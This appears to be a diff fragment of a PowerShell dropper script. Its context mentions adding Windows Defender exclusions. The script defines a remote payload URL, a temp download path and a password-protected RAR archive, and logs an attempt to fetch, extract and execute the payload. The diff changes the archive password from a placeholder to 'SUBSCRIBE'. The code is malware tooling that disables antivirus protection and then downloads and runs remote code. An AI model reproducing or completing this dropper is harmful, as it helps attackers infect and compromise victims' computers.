@@ -124,7 +124,7 @@ Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender e
 $payloadUrl = "https://mywebsite.com/payload.rar" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PAYLOAD URL
 $payloadPath = "C:\Windows\Temp\payload.rar"
 $extractPath = "C:\Windows\Temp\PayloadExtracted"
-$rarPassword = "YourPasswordHere" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PASSWORD
+$rarPassword = "SUBSCRIBE" # <-- IMPORTANT: REPLACE WITH YOUR ACTUAL PASSWORD
 
 Add-Content -Path $logPath -Value "Attempting to fetch, extract, and execute payload from $payloadUrl."
 
